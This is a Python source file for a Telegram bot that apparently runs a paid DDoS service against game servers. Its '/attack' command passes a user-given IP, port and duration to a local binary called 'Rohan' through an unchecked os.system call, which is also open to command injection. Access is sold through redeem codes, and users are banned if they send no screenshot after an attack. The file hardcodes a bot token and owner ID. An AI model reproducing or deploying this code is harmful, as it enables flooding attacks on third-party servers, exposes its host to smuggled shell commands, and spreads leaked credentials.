import os
import asyncio
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, filters, CallbackContext

TELEGRAM_BOT_TOKEN = '7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70'  
OWNER_ID = '1866961136'  
DATA_FILE = 'data.json'

user_access = {}
redeem_codes = {}
banned_users = {}
admins = {OWNER_ID}  
attack_timers = {}

def load_data():
    global user_access, redeem_codes, banned_users, admins
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
            user_access = data.get('user_access', {})
            redeem_codes = data.get('redeem_codes', {})
            banned_users = data.get('banned_users', {})
            admins = set(data.get('admins', [OWNER_ID]))

def save_data():
    data = {
        'user_access': user_access,
        'redeem_codes': redeem_codes,
        'banned_users': banned_users,
        'admins': list(admins)
    }
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("🔥 Welcome! Use /help to see available commands.")

async def help_command(update: Update, context: CallbackContext):
    message = (
        "🔧 *Available Commands:*\n\n"
        "/start - Show welcome message\n"
        "/help - Show this help message\n"
        "/attack <ip> <port> <duration> - Start an attack\n"
        "/check_access - Check your access status\n"
        "/redeem <days> - Generate a redeem code (Admin only)\n"
        "/redeem_code <code> - Redeem your access\n"
        "/ban <user_id> <reason> - Ban a user (Admins only)\n"
        "/banned_users - List banned users (Admins only)\n"
        "/unban <user_id> - Unban a user (Admins only)\n"
        "/add_admin <user_id> - Add an admin (Owner only)\n"
        "/remove_admin <user_id> - Remove an admin (Owner only)"
    )
    await update.message.reply_text(message)

async def attack(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    
    if user_id in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args
    duration = int(duration)

    os.system(f"./Rohan {ip} {port} {duration}")
    await update.message.reply_text(f"⚔️ Attack started on {ip}:{port} for {duration} seconds!")

    for remaining in range(duration, 0, -1):
        await asyncio.sleep(1)
        if remaining % 10 == 0 or remaining <= 5:
            await update.message.reply_text(f"⏳ Attack Time Left: {remaining} sec")
    
    await update.message.reply_text("✅ Attack Ended!")

    await update.message.reply_text("📸 Please send a screenshot of the game as proof!")

    await asyncio.sleep(120)

    if user_id not in user_access:
        banned_users[user_id] = "Failed to provide proof"
        save_data()
        await update.message.reply_text(f"🚫 {update.message.from_user.first_name} has been banned!")

async def redeem_access(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) not in admins:
        await update.message.reply_text("⚠️ Only admins can generate redeem codes!")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ Usage: /redeem <days>")
        return

    days = int(args[0])
    code = "Rohan-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    expire_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')

    redeem_codes[code] = {"expires": expire_date, "group": update.message.chat_id > 0}
    save_data()

    await update.message.reply_text(f"✅ Redeem Code Created: `{code}` (Expires: {expire_date})")

async def redeem_code(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    args = context.args

    if len(args) != 1:
        await update.message.reply_text("⚠️ Usage: /redeem_code <code>")
        return

    code = args[0]

    if code not in redeem_codes:
        await update.message.reply_text("⚠️ Invalid redeem code!")
        return

    if update.message.chat_id > 0:
        user_access[user_id] = True
        await update.message.reply_text("✅ Access Granted!")
    else:
        group_members = context.bot.get_chat_members(update.message.chat_id)
        for member in group_members:
            user_access[str(member.user.id)] = True
        await update.message.reply_text("✅ Group Access Granted!")

    del redeem_codes[code]
    save_data()

async def ban(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) not in admins:
        await update.message.reply_text("⚠️ Only admins can ban users!")
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text("⚠️ Usage: /ban <user_id> <reason>")
        return

    user_id = args[0]
    reason = ' '.join(args[1:])

    banned_users[user_id] = reason
    save_data()
    await update.message.reply_text(f"🚫 User {user_id} has been banned! Reason: {reason}")

async def unban(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) not in admins:
        await update.message.reply_text("⚠️ Only admins can unban users!")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ Usage: /unban <user_id>")
        return

    user_id = args[0]
    if user_id in banned_users:
        del banned_users[user_id]
        save_data()
        await update.message.reply_text(f"✅ User {user_id} has been unbanned!")

async def add_admin(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("⚠️ Only the owner can add admins!")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ Usage: /add_admin <user_id>")
        return

    user_id = args[0]
    admins.add(user_id)
    save_data()
    await update.message.reply_text(f"✅ User {user_id} has been added as an admin!")

async def remove_admin(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("⚠️ Only the owner can remove admins!")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ Usage: /remove_admin <user_id>")
        return

    user_id = args[0]
    admins.discard(user_id)
    save_data()
    await update.message.reply_text(f"✅ User {user_id} has been removed as an admin!")

app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("redeem", redeem_access))
app.add_handler(CommandHandler("redeem_code", redeem_code))
app.add_handler(CommandHandler("ban", ban))
app.add_handler(CommandHandler("unban", unban))
app.add_handler(CommandHandler("add_admin", add_admin))
app.add_handler(CommandHandler("remove_admin", remove_admin))

app.run_polling()
